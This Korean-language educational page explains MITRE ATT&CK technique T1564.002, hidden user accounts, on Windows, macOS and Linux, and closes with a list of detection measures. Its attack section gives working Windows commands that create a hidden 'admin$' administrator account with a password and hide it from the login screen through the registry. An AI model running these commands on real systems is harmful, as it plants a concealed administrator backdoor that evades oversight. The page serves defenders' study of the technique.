T1564.002: Hidden Users

Defense Evasion

Hidden Users

로그인 화면과 사용자 관리에서 보이지 않는 숨겨진 계정을 생성

#1. 숨겨진 사용자란?

"투명 인간" 비유

건물(시스템)에 출입 가능하지만 명부(사용자 목록)에 이름이 없는 투명 인간을 만드는 것입니다. Windows에서는 레지스트리로 로그인 화면에서 계정을 숨기고, macOS에서는 UserShell을 /usr/bin/false로 설정하거나 IsHidden 속성을 사용합니다. 관리자가 사용자 목록을 확인해도 숨겨진 계정이 보이지 않습니다.

Windows

  • $ 접미사 계정: user$ (SAM에서 숨김)
  • 레지스트리: SpecialAccounts\UserList
  • net user에서 $ 계정 미표시

macOS / Linux

  • macOS: IsHidden=1 (dscl)
  • Linux: UID < 1000 (시스템 계정 범위)
  • /etc/passwd 직접 편집

#2. 공격 기법

# Windows: $ 접미사로 숨겨진 관리자 계정 생성
net user admin$ P@ssw0rd123! /add
net localgroup administrators admin$ /add
# net user 명령으로 조회 시 admin$가 표시되지 않음
# 레지스트리로 로그인 화면에서 숨기기
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\
CurrentVersion\Winlogon\SpecialAccounts\UserList"
/v admin$ /t REG_DWORD /d 0 /f
# 값 0 = 로그인 화면에서 숨김

방어 방법

  • Event ID 4720: 사용자 계정 생성 이벤트 모니터링
  • Event ID 4732: 관리자 그룹 멤버 추가 모니터링
  • SAM 레지스트리 감사: SpecialAccounts 키 변경 감시
  • 정기 감사: WMIC/PowerShell로 전체 계정 열거
